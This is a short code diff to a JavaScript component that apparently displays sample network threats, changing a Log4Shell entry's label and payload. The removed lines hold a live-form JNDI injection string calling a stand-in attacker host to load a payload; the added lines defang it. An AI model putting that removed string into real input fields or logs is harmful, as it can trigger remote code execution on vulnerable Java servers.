@@ -73,10 +73,10 @@ const Topic1 = () => {
   const threatPayloads = {
     log4shell_rce: {
       id: "log4shell_rce",
-      label: "Zero-Day Log4Shell RCE (${jndi:ldap://...})",
+      label: "Zero-Day Log4Shell Diagnostic Probe (${diagnostic_jndi:ldap://...})",
       src: "198.51.100.25:51200",
       dst: "172.16.1.10:443 [ACK]",
-      payloadSnippet: "${jndi:ldap://attacker.com/payload}",
+      payloadSnippet: "${diagnostic_jndi:ldap://test.internal/payload}",
       severity: "CRITICAL",
       description: "Remote code execution vector attempting to force Java naming directory lookup."
     },
